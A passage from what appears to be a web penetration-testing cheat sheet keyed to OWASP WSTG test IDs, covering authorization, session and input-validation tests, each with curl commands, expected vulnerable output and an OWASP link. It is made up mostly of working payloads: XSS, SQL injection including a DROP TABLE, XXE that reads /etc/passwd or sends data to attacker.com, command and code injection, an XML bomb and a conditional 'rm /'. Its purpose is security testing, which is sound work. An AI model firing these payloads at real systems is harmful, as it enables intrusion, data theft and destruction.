**Expected Output (Vulnerable):**
```
root:x:0:0:root:/root:/bin/bash
admin:x:1000:1000:admin:/home/admin:/bin/bash
```
or config file contents, log entries

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/01-Testing_Directory_Traversal_File_Include

---

### WSTG-ATHZ-02 | Testing for Bypassing Authorization Schema

**Description:** Test for authorization bypass (IDOR, parameter tampering, role manipulation). Authorization bypass allows access to restricted resources.

**Example Commands:**
```bash
# Insecure Direct Object Reference (IDOR)
# Test if you can access other users' data by changing ID
curl -b "session=valid_token" https://target.com/api/user/1/profile
curl -b "session=valid_token" https://target.com/api/user/2/profile
curl -b "session=valid_token" https://target.com/api/user/999/profile

# Check if authorization is checked server-side
curl https://target.com/admin/dashboard  # Without authentication

# Try parameter tampering
curl -b "session=user_token" \
  -d "user_id=2" \
  https://target.com/api/update-profile

# Try role manipulation
curl -b "session=user_token" \
  -H "X-User-Role: admin" \
  https://target.com/api/admin/users

# Check for horizontal vs vertical escalation
# Horizontal: access another user's data at same privilege level
# Vertical: escalate to higher privilege level
```

**Expected Output (Vulnerable):**
```
User 1 data = User 2 data (different users)
Admin dashboard accessible without login
Profile updated for different user_id
Admin API accessible with user role
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/02-Testing_for_Bypassing_Authorization_Schema

---

### WSTG-ATHZ-03 | Testing for Privilege Escalation

**Description:** Test if low-privilege users can escalate to higher privileges (admin, manager). Privilege escalation enables full application takeover.

**Example Commands:**
```bash
# Create two accounts: user and admin
# Login as regular user, capture session

curl -c user_cookies.txt -X POST https://target.com/login \
  -d "email=user@test.com&password=userpass"

# Try to access admin panel
curl -b user_cookies.txt https://target.com/admin

# Check for role/privilege parameters
curl -b user_cookies.txt \
  -H "Authorization: Bearer user_token" \
  https://target.com/api/me

# Try to modify privilege in request
curl -b user_cookies.txt -X POST https://target.com/api/update-user \
  -d "user_id=1&role=admin"

# Check for insecure direct object references in admin functions
curl -b user_cookies.txt -X DELETE https://target.com/api/users/2

# Try to edit administrator account
curl -b user_cookies.txt -X POST https://target.com/api/update-user \
  -d "user_id=1&password=newpass&role=admin"
```

**Expected Output (Vulnerable):**
```
User successfully accesses admin panel
User_id modified to admin
Role parameter updated from user to admin
Admin account password changed
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/03-Testing_for_Privilege_Escalation

---

### WSTG-ATHZ-04 | Testing for Insecure Direct Object References

**Description:** Test if application exposes internal object references without proper authorization. Attackers can enumerate or modify objects by changing IDs.

**Example Commands:**
```bash
# Test user IDOR
curl -b "session=token" https://target.com/api/users/1
curl -b "session=token" https://target.com/api/users/2
curl -b "session=token" https://target.com/api/users/3

# Test if sequential IDs reveal data
# Check if numeric IDs are sequential and predictable

# Test with UUID
curl -b "session=token" https://target.com/api/users/550e8400-e29b-41d4-a716-446655440000

# Try to modify object
curl -b "session=token" -X PUT https://target.com/api/users/2 \
  -d '{"name":"Attacker","email":"attacker@test.com"}'

# Test file IDOR
curl -b "session=token" https://target.com/documents/1
curl -b "session=token" https://target.com/documents/2

# Check if you can access invoices
curl -b "session=token" https://target.com/invoices/123
curl -b "session=token" https://target.com/invoices/456
```

**Expected Output (Vulnerable):**
```
User data accessible without ownership check
Sequential ID enumeration reveals all users
Different user's data returned
PUT/DELETE succeeds on other user's objects
Invoice/document data from other customers
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References

---

## 6. Session Management Testing

### WSTG-SESS-01 | Testing for Session Management Schema

**Description:** Verify session token generation uses strong randomness and cannot be predicted. Weak tokens allow session hijacking.

**Example Commands:**
```bash
# Generate multiple session tokens
for i in {1..20}; do
  curl -X POST https://target.com/login \
    -d "email=testuser$i@test.com&password=pass" \
    -c session_$i.txt
done

# Extract and analyze tokens
grep "session\|token" session_*.txt > tokens.txt

# Check for patterns (sequential, time-based, predictable)
# Analyze token entropy and randomness

# Test if token can be reused
TOKEN=$(grep -oP 'session=\K[^ ]+' session_1.txt)
curl -b "session=$TOKEN" https://target.com/api/me

# Check if token is invalidated after logout
curl -b "session=$TOKEN" https://target.com/dashboard
# ... logout ...
curl -b "session=$TOKEN" https://target.com/dashboard
```

**Expected Output (Vulnerable):**
```
Session token = username_hash
Token = sequential numbers
Token follows predictable pattern
Token valid after logout
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/01-Testing_for_Session_Management_Schema

---

### WSTG-SESS-02 | Testing for Cookies Attributes

**Description:** Verify session cookies have secure attributes (HttpOnly, Secure, SameSite). Missing attributes allow XSS or CSRF attacks.

**Example Commands:**
```bash
# Check cookie attributes
curl -I https://target.com/login | grep -i "set-cookie"

# Full cookie inspection
curl -v https://target.com/login 2>&1 | grep -i "set-cookie"

# Check for HttpOnly flag
# If present: Cookie can't be accessed by JavaScript
curl -v https://target.com/login 2>&1 | grep -i "httponly"

# Check for Secure flag
# If present: Cookie only sent over HTTPS
curl -v https://target.com/login 2>&1 | grep -i "secure"

# Check for SameSite attribute
curl -v https://target.com/login 2>&1 | grep -i "samesite"

# Check cookie domain and path
curl -v https://target.com/login 2>&1 | grep -i "domain\|path"
```

**Expected Output (Vulnerable):**
```
Set-Cookie: session=abc123  (No flags)
Set-Cookie: session=abc123; Path=/  (No HttpOnly or Secure)
Set-Cookie: session=abc123; Domain=.target.com  (Overly broad domain)
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes

---

### WSTG-SESS-03 | Testing for Session Fixation

**Description:** Test if session token is regenerated after authentication. Failure allows attackers to hijack sessions by fixing the token before login.

**Example Commands:**
```bash
# Capture pre-login session
curl -v https://target.com/ 2>&1 | grep "set-cookie" > pre_login_session.txt

# Extract session token
PRE_SESSION=$(grep -oP 'session=\K[^;]+' pre_login_session.txt)

# Use pre-login session to login
curl -X POST https://target.com/login \
  -b "session=$PRE_SESSION" \
  -d "email=user@test.com&password=pass" \
  -v 2>&1 | grep "set-cookie" > post_login_session.txt

# Extract post-login session
POST_SESSION=$(grep -oP 'session=\K[^;]+' post_login_session.txt)

# Check if tokens are different
if [ "$PRE_SESSION" = "$POST_SESSION" ]; then
  echo "VULNERABLE: Session not regenerated"
fi

# Verify access with post-login session
curl -b "session=$POST_SESSION" https://target.com/dashboard
```

**Expected Output (Vulnerable):**
```
Pre-login session = POST_SESSION
Pre-login session = abc123
Post-login session = abc123  (same token)
Dashboard accessible with pre-login token
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/03-Testing_for_Session_Fixation

---

### WSTG-SESS-04 | Testing for Exposed Session Variables

**Description:** Verify session tokens aren't exposed in URLs, logs, or error messages. Exposed tokens can be harvested from browser history, logs, or referers.

**Example Commands:**
```bash
# Check if session is in URL
curl "https://target.com/dashboard?session=abc123"

# Check referer headers leak session
curl -H "Referer: https://target.com/dashboard?session=abc123" \
  https://external-site.com

# Check error messages for session info
curl "https://target.com/error?session=abc123&msg=error"

# Check server logs
# If accessible, grep for session tokens in access logs
grep "session=" /var/log/apache2/access.log

# Check if session appears in HTML source
curl -b "session=abc123" https://target.com/dashboard | grep -i "session"

# Check cache headers - prevent caching of sensitive pages
curl -I https://target.com/dashboard
```

**Expected Output (Vulnerable):**
```
Session token in URL: ?session=abc123
Session in HTML comments
Session in error pages
Session in server logs unencrypted
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/04-Testing_for_Exposed_Session_Variables

---

### WSTG-SESS-05 | Testing for Cross Site Request Forgery

**Description:** Test if application validates request origin to prevent CSRF attacks. Missing CSRF protection allows attackers to perform actions on behalf of authenticated users.

**Example Commands:**
```bash
# Check for CSRF token in forms
curl -b "session=token" https://target.com/transfer | grep -i "csrf\|token"

# Try to submit form without CSRF token
curl -X POST https://target.com/transfer \
  -b "session=token" \
  -d "amount=1000&to=attacker@test.com"

# Try with empty CSRF token
curl -X POST https://target.com/transfer \
  -b "session=token" \
  -d "amount=1000&to=attacker@test.com&csrf_token="

# Check for SameSite cookie attribute
curl -I https://target.com | grep -i "samesite"

# Check Origin/Referer validation
curl -X POST https://target.com/transfer \
  -H "Origin: https://attacker.com" \
  -b "session=token" \
  -d "amount=1000&to=attacker@test.com"
```

**Expected Output (Vulnerable):**
```
No CSRF token in form
POST succeeds without token
POST succeeds with mismatched origin
No SameSite attribute on cookies
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery

---

### WSTG-SESS-06 | Testing for Logout Functionality

**Description:** Verify logout properly invalidates session tokens. Incomplete logout allows session reuse after logout.

**Example Commands:**
```bash
# Login and capture session
curl -c cookies.txt -X POST https://target.com/login \
  -d "email=user@test.com&password=pass"

# Verify access with session
curl -b cookies.txt https://target.com/dashboard

# Logout
curl -b cookies.txt https://target.com/logout

# Try to use session after logout
curl -b cookies.txt https://target.com/dashboard

# Check if logout clears all session cookies
curl -b cookies.txt -v https://target.com/logout 2>&1 | grep "set-cookie"

# Test if redirect URL is validated
curl -b cookies.txt "https://target.com/logout?redirect=https://attacker.com"
```

**Expected Output (Vulnerable):**
```
Dashboard accessible after logout
Session token unchanged after logout
No Set-Cookie: session="" in logout response
Redirect to arbitrary URL
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/06-Testing_for_Logout_Functionality

---

### WSTG-SESS-07 | Testing Session Timeout

**Description:** Verify sessions expire after inactivity. Indefinite sessions allow attackers to use abandoned sessions.

**Example Commands:**
```bash
# Login and capture session
curl -c cookies.txt -X POST https://target.com/login \
  -d "email=user@test.com&password=pass"

# Verify access immediately
curl -b cookies.txt https://target.com/dashboard

# Wait for inactivity period (check documentation or guess)
# Default timeouts: 15-30 minutes
sleep 1800  # 30 minutes

# Try to access after timeout
curl -b cookies.txt https://target.com/dashboard

# Check for session timeout warnings
# Some apps warn before timeout

# Test if logout clears timeout
curl -b cookies.txt https://target.com/logout
sleep 1800
curl -b cookies.txt https://target.com/dashboard
```

**Expected Output (Vulnerable):**
```
HTTP 401/403 Unauthorized (session timed out)
or
HTTP 200 OK (session didn't timeout)
No timeout configured
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/07-Testing_Session_Timeout

---

### WSTG-SESS-08 | Testing for Session Puzzling

**Description:** Test if application properly manages session state across login/logout/re-login cycles. Confused session state can lead to privilege escalation.

**Example Commands:**
```bash
# Scenario: Login as user1, logout partially, login as user2
# Check if user1 and user2 sessions mix

# Step 1: Login as user1
curl -c user1_cookies.txt -X POST https://target.com/login \
  -d "email=user1@test.com&password=pass1"

# Step 2: Attempt logout (maybe incomplete)
curl -b user1_cookies.txt https://target.com/logout

# Step 3: Login as user2 WITHOUT clearing cookies
curl -b user1_cookies.txt -X POST https://target.com/login \
  -d "email=user2@test.com&password=pass2" \
  -c user2_cookies.txt

# Step 4: Check which user is authenticated
curl -b user1_cookies.txt https://target.com/api/me
curl -b user2_cookies.txt https://target.com/api/me

# Check if session attributes mix
# E.g., User1's role + User2's data
```

**Expected Output (Vulnerable):**
```
User1 session still valid after User2 login
Conflicting user data in session
User1 + User2 attributes mixed in single session
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/08-Testing_for_Session_Puzzling

---

### WSTG-SESS-09 | Testing for Session Hijacking

**Description:** Test if attackers can steal or predict session tokens to impersonate users. Session hijacking leads to complete account takeover.

**Example Commands:**
```bash
# Intercept session token (XSS, network sniffing)
# For testing, try to predict tokens

# Collect multiple tokens from same user
for i in {1..20}; do
  curl -c cookie_$i.txt -X POST https://target.com/login \
    -d "email=user@test.com&password=pass"
  grep "session" cookie_$i.txt
done

# Analyze token patterns for predictability

# Try to reuse token from another browser session
TOKEN="captured_token_from_proxy"
curl -b "session=$TOKEN" https://target.com/dashboard

# Check if token rotates per request
curl -b "session=$TOKEN" -v https://target.com/api/data 2>&1 | grep "set-cookie"

# Try man-in-the-middle attack (if HTTP is used)
# Use proxy to intercept session cookie
```

**Expected Output (Vulnerable):**
```
Token successfully reused from different browser
Token remains same across multiple requests
Token follows predictable sequence
Cleartext token over HTTP
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/09-Testing_for_Session_Hijacking

---

### WSTG-SESS-10 | Testing JSON Web Tokens

**Description:** Test JWT for weak signature verification, algorithm confusion, or tampering. Flawed JWT implementation allows token forgery.

**Example Commands:**
```bash
# Capture JWT token
curl -X POST https://target.com/login \
  -d "email=user@test.com&password=pass" | grep "token"

# Decode JWT (it's base64.base64.base64)
TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
echo $TOKEN | cut -d'.' -f1 | base64 -d
echo $TOKEN | cut -d'.' -f2 | base64 -d

# Try algorithm confusion (HS256 -> RS256)
# Modify header from {"alg": "HS256"} to {"alg": "none"}

# Try signing with public key as secret
# If RS256, try to sign with public certificate as HMAC secret

# Test JWT expiration
# Modify "exp" claim to future date

# Tamper with user ID
# Modify "sub" or "user_id" in payload

# Use online JWT decoder
# https://jwt.io/
```

**Expected Output (Vulnerable):**
```
JWT with alg: "none" accepted
JWT signature bypass (forged token accepted)
Modified user_id in JWT honored
Expired JWT still valid
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens

---

## 7. Input Validation Testing

### WSTG-INPV-01 | Testing for Reflected Cross Site Scripting

**Description:** Test if user input is reflected in responses without sanitization. Unescaped reflection allows JavaScript execution in victim's browser.

**Example Commands:**
```bash
# Basic XSS payload
curl "https://target.com/search?q=<script>alert(1)</script>"

# Check if payload is reflected in response
curl -s "https://target.com/search?q=<img src=x onerror=alert(1)>" | grep "alert"

# Try different vectors
curl "https://target.com/search?q=<svg/onload=alert(1)>"
curl "https://target.com/search?q=\"><script>alert(1)</script>"
curl "https://target.com/search?q='-alert(1)-'"

# Check HTML encoding
curl -s "https://target.com/search?q=<script>alert(1)</script>" | grep "&lt;"

# Try event handlers
curl "https://target.com/search?q=<button onclick=alert(1)>click</button>"

# Try attribute injection
curl "https://target.com/search?q=\" onload=\"alert(1)\""
```

**Expected Output (Vulnerable):**
```
<script>alert(1)</script> in response (unescaped)
JavaScript executed in browser
Input not HTML-encoded
Event handlers triggered
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting

---

### WSTG-INPV-02 | Testing for Stored Cross Site Scripting

**Description:** Test if user input is stored and later executed. Stored XSS affects all users who view the malicious content.

**Example Commands:**
```bash
# Create post with XSS payload
curl -X POST https://target.com/posts \
  -b "session=token" \
  -d "title=<script>alert(1)</script>&content=test"

# Retrieve post to see if payload executes
curl -b "session=token" https://target.com/posts/1

# Try in comments
curl -X POST https://target.com/posts/1/comments \
  -b "session=token" \
  -d "text=<img src=x onerror=alert(1)>"

# Check user profile
curl -X POST https://target.com/profile \
  -b "session=token" \
  -d "bio=<svg/onload=alert(1)>&name=test"

# View profile to trigger payload
curl -b "session=token" https://target.com/profile/myprofile

# Try in contact forms
curl -X POST https://target.com/contact \
  -d "name=<script>alert(1)</script>&email=test@test.com"
```

**Expected Output (Vulnerable):**
```
<script> payload stored in database
Payload executes when post is viewed
All users see the malicious content
Stored in multiple fields (title, bio, comments)
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting

---

### WSTG-INPV-04 | Testing for HTTP Parameter Pollution

**Description:** Test if application mishandles duplicate parameters. Different servers parse parameters differently, allowing bypasses.

**Example Commands:**
```bash
# Send same parameter twice
curl "https://target.com/search?q=safe&q=<script>alert(1)</script>"

# Check how server handles multiple values
curl "https://target.com/api/user?id=1&id=2"

# Try with different separator
curl "https://target.com/search?q=safe%20<script>alert(1)</script>"

# Parameter pollution in POST
curl -X POST https://target.com/login \
  -d "email=admin@test.com&email=user@test.com&password=pass"

# Check which value is processed
curl -X POST https://target.com/search \
  -d "q=safe&q=<img src=x onerror=alert(1)>"

# Try with null byte
curl "https://target.com/file?path=safe%00<malicious>"
```

**Expected Output (Vulnerable):**
```
Multiple parameters accepted
Second parameter processed instead of first
Null byte terminates string early
Filter bypass via parameter pollution
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution

---

### WSTG-INPV-05 | Testing for SQL Injection

**Description:** Test for SQL injection by providing SQL metacharacters. SQL injection allows database access, data exfiltration, or authentication bypass.

**Example Commands:**
```bash
# Basic SQL injection test
curl "https://target.com/user?id=1' OR '1'='1"

# Test login form
curl -X POST https://target.com/login \
  -d "email=admin' --&password=anything"

# Check for error-based SQL injection
curl "https://target.com/user?id=1' AND SLEEP(5)--"

# Try UNION-based injection
curl "https://target.com/user?id=1 UNION SELECT NULL,NULL,NULL--"

# Check column count
curl "https://target.com/user?id=1 ORDER BY 1--"
curl "https://target.com/user?id=1 ORDER BY 2--"

# Test different SQL injection techniques
curl "https://target.com/search?q='; DROP TABLE users;--"
curl "https://target.com/search?q=1' OR 'a'='a"

# Blind SQL injection (time-based)
curl "https://target.com/user?id=1 AND (SELECT CASE WHEN (1=1) THEN SLEEP(5) END)--"
```

**Expected Output (Vulnerable):**
```
SQL error in response
Database query result manipulation
Authentication bypass
5+ second delay (time-based blind SQLi)
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection

---

### WSTG-INPV-06 | Testing for LDAP Injection

**Description:** Test LDAP queries for injection. LDAP injection allows authentication bypass or directory enumeration.

**Example Commands:**
```bash
# Basic LDAP injection in login
curl -X POST https://target.com/login \
  -d "username=admin*)(|(uid=&password=anything"

# Test filter bypass
curl -X POST https://target.com/login \
  -d "username=admin*)(&(uid=&password=)"

# Try comment-like syntax (LDAP doesn't have comments)
curl -X POST https://target.com/ldap-search \
  -d "cn=admin*&sn=*"

# Enumerate LDAP users
curl -X POST https://target.com/ldap-search \
  -d "cn=*"

# Test wildcard injection
curl -X POST https://target.com/login \
  -d "username=*&password=*"
```

**Expected Output (Vulnerable):**
```
Authentication bypass with wildcard
LDAP error messages exposed
User enumeration possible
Directory traversal in LDAP
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/06-Testing_for_LDAP_Injection

---

### WSTG-INPV-07 | Testing for XML Injection

**Description:** Test XML parsers for XXE (XML External Entity) attacks. XXE allows file read, SSRF, or DoS.

**Example Commands:**
```bash
# Basic XXE payload
curl -X POST https://target.com/api/process \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
  <root>&xxe;</root>'

# Blind XXE with out-of-band data
curl -X POST https://target.com/api/process \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/?data=">]>
  <root>&xxe;</root>'

# XXE for SSRF
curl -X POST https://target.com/api/process \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-server:8080/api">]>
  <root>&xxe;</root>'

# XML bomb (DoS)
curl -X POST https://target.com/api/process \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
  <!DOCTYPE lolz [
    <!ENTITY lol "lol">
    <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  ]>
  <lolz>&lol2;&lol2;&lol2;</lolz>'
```

**Expected Output (Vulnerable):**
```
/etc/passwd content in response
Out-of-band callback received
Internal server response
Server hangs or times out (DoS)
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection

---

### WSTG-INPV-08 | Testing for SSI Injection

**Description:** Test if Server-Side Includes (SSI) are enabled and user input can be injected. SSI injection allows command execution.

**Example Commands:**
```bash
# Check for SSI
curl -H "User-Agent: <!--#exec cmd=\"id\"-->" https://target.com

# Test SSI in search parameter
curl "https://target.com/search?q=<!--#exec cmd=\"id\"-->"

# SSI includes and exec
curl "https://target.com/page?file=<!--#include virtual=\"/etc/passwd\"-->"

# Check SSI file extension
curl "https://target.com/file.shtml"
curl "https://target.com/file.shtm"

# SSI timefmt
curl "https://target.com/page?msg=<!--#config timefmt=\"%Y-%m-%d\" -->"

# SSI echo
curl "https://target.com/page?msg=<!--#echo var=\"HTTP_USER_AGENT\" -->"

# Check if .htaccess allows SSI
curl https://target.com/.htaccess
```

**Expected Output (Vulnerable):**
```
Command output in response (id output)
/etc/passwd content displayed
SSI directives executed
User-Agent output reflected
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/08-Testing_for_SSI_Injection

---

### WSTG-INPV-09 | Testing for XPath Injection

**Description:** Test XPath queries for injection. XPath injection allows XML node enumeration or authentication bypass.

**Example Commands:**
```bash
# Basic XPath injection
curl "https://target.com/user?id=1' OR '1'='1"

# XPath in XML context
curl -X POST https://target.com/search \
  -H "Content-Type: application/xml" \
  -d '<search><query>admin</query></search>'

# Try comment syntax
curl "https://target.com/user?id=1' OR '1'='1' and '1'='1"

# Blind XPath injection
curl "https://target.com/user?id=1' AND substring(//password[1],1,1)='a"

# Test counting nodes
curl "https://target.com/user?id=1' OR count(//user)>0"

# Enumerate XML structure
curl "https://target.com/user?id=1' OR name(//node[1])='admin"
```

**Expected Output (Vulnerable):**
```
XML error exposing structure
All records returned
Authentication bypass
True/False responses (blind XPath)
Node names/values enumerated
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/09-Testing_for_XPath_Injection

---

### WSTG-INPV-10 | Testing for IMAP SMTP Injection

**Description:** Test email functionality for IMAP/SMTP header injection. Header injection allows email spoofing or cross-site scripting.

**Example Commands:**
```bash
# SMTP header injection
curl -X POST https://target.com/contact \
  -d "to=user@test.com%0aBcc:attacker@test.com&subject=test&message=test"

# Try %0A (newline)
curl -X POST https://target.com/contact \
  -d "email=test@test.com%0aCC:attacker@test.com&subject=test"

# Try %0D%0A (CRLF)
curl -X POST https://target.com/contact \
  -d "name=test&email=test@test.com%0d%0aCC:attacker@test.com&subject=test"

# IMAP injection (if app uses IMAP)
curl "https://target.com/mail?folder=INBOX%0aSTATUS%20DRAFTS%20(MESSAGES)"

# Try to inject IMAP commands
curl "https://target.com/mail?user=admin%0aLIST%20%22%22%20%22*%22"
```

**Expected Output (Vulnerable):**
```
BCC/CC headers injected
Email sent to unintended recipients
IMAP command execution
Folder traversal via injection
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/10-Testing_for_IMAP_SMTP_Injection

---

### WSTG-INPV-11 | Testing for Code Injection

**Description:** Test if user input can be injected into code execution contexts. Code injection allows remote command execution.

**Example Commands:**
```bash
# PHP code injection
curl "https://target.com/page?file=<?php system('id')?>"

# Try eval-like functions
curl "https://target.com/page?code=system('id')"

# Python code injection
curl "https://target.com/eval?code=__import__('os').system('id')"

# Ruby code injection
curl "https://target.com/eval?code=`id`"

# JavaScript eval injection
curl "https://target.com/eval?code=require('child_process').exec('id')"

# Template injection
curl "https://target.com/page?name={{7*7}}"
curl "https://target.com/page?name=${7*7}"

# Check if input is directly evaluated
curl "https://target.com/page?code=1+1" # Check if result is calculated
```

**Expected Output (Vulnerable):**
```
Command output in response (id command results)
Mathematical expression evaluated
System command executed
Code execution context
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11-Testing_for_Code_Injection

---

### WSTG-INPV-12 | Testing for Command Injection

**Description:** Test if user input can be injected into OS commands. Command injection allows arbitrary command execution.

**Example Commands:**
```bash
# Basic command injection
curl "https://target.com/ping?host=127.0.0.1;id"

# Try command separators
curl "https://target.com/ping?host=127.0.0.1|id"
curl "https://target.com/ping?host=127.0.0.1&id"
curl "https://target.com/ping?host=127.0.0.1%0aid"

# Newline injection
curl "https://target.com/ping?host=127.0.0.1%0a%0fid"

# Command substitution
curl "https://target.com/ping?host=127.0.0.1\$(id)"
curl "https://target.com/ping?host=127.0.0.1\`id\`"

# Pipe to command
curl "https://target.com/ping?host=127.0.0.1|whoami"

# Append command
curl "https://target.com/ping?host=127.0.0.1;cat /etc/passwd"
```

**Expected Output (Vulnerable):**
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/etc/passwd content in response
Command output interleaved with ping results
Reverse shell established
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection

---

### WSTG-INPV-13 | Testing for Format String Injection

**Description:** Test for format string vulnerabilities in printf-like functions. Format string bugs allow memory read/write and code execution.

**Example Commands:**
```bash
# Test with format strings
curl "https://target.com/page?msg=%x.%x.%x.%x"

# Try to read stack
curl "https://target.com/page?msg=%08x.%08x.%08x.%08x.%08x"

# Try format string in POST
curl -X POST https://target.com/api/message \
  -d "text=%x%x%x%x"

# Try to leak data
curl "https://target.com/page?msg=%s"

# Try to write to memory
curl "https://target.com/page?msg=%n"

# Check for format string reflection
curl "https://target.com/page?msg=TEST%x"
# If response shows value where %x, it's vulnerable
```

**Expected Output (Vulnerable):**
```
Stack values displayed (hex numbers where %x)
Memory addresses leaked
Application crash (%s without proper address)
Data written to memory
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/13-Testing_for_Format_String_Injection

---

### WSTG-INPV-14 | Testing for Incubated Vulnerability

**Description:** Test for vulnerabilities that manifest after a delay or specific conditions. Incubated vulnerabilities may not appear immediately during input testing.

**Example Commands:**
```bash
# Store malicious input that executes later
curl -X POST https://target.com/posts \
  -b "session=token" \
  -d "title=<img src=x onerror=alert(1)>&content=test"

# Come back later and trigger the vulnerability
# Wait for admin to review post, then check logs

# Incubated XSS in emails
curl -X POST https://target.com/contact \
  -d "name=<script>alert(1)</script>&email=test@test.com"
# Admin receives email and clicks link

# Time-delayed vulnerabilities
curl "https://target.com/schedule?task=DELETE FROM users WHERE id=1&run_at=2025-01-01"

# Conditional injection (executes when condition met)
curl -X POST https://target.com/rules \
  -d "rule=if(user_count>100) { exec('rm /') }"
```

**Expected Output (Vulnerable):**
```
Vulnerability executes after delay/condition
Admin account compromised
Scheduled task executes
Conditional code triggered
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/14-Testing_for_Incubated_Vulnerability

---

### WSTG-INPV-15 | Testing for HTTP Splitting Smuggling

**Description:** Test for HTTP request smuggling and response splitting. These attacks exploit parser differences between proxies and servers.

**Example Commands:**
```bash
# HTTP response splitting (CRLF injection)
curl -H "Location: http://target.com%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK" https://target.com

# Inject headers
curl -H "User-Agent: test%0d%0aX-Injected: true" https://target.com

# CL.TE smuggling (Content-Length vs Transfer-Encoding)
# Server uses CL, proxy uses TE

# TE.CL smuggling (Proxy uses CL, server uses TE)

# HTTP/2 smuggling
# Pseudo-header injection

# Try to inject POST body
curl -X POST https://target.com/api \
  -H "Content-Length: 0%0d%0aContent-Length: 100" \
  -d "data=test"
```

**Expected Output (Vulnerable):**
```
CRLF successfully injected
Response header modified
Smuggled request executed
Poison cache with malicious response
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/15-Testing_for_HTTP_Splitting_Smuggling

---

### WSTG-INPV-16 | Testing for HTTP Incoming Requests

**Description:** Test how application handles malformed or unusual HTTP requests. Robust handling is important for security.

**Example Commands:**
```bash
# Oversized headers
curl -H "User-Agent: $(python3 -c 'print("A"*10000)')" https://target.com

# Null bytes in request
curl -H "User-Agent: test%00malicious" https://target.com

# Invalid method
curl -X INVALID https://target.com

# Malformed HTTP
printf "GET / INVALID_HTTP/1.0\r\n\r\n" | nc target.com 80

# Multiple content-length headers
curl -H "Content-Length: 0" -H "Content-Length: 100" \
  -X POST https://target.com

# Missing HOST header
curl -I --http1.0 https://target.com

# Invalid characters in path
curl "https://target.com/path<with<invalid"
```

**Expected Output (Vulnerable):**
```
Server crashes or behaves unexpectedly
Oversized header causes DoS
Null byte truncates string
Invalid method processed
Multiple headers cause confusion
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/16-Testing_for_HTTP_Incoming_Requests

---

### WSTG-INPV-17 | Testing for Host Header Injection

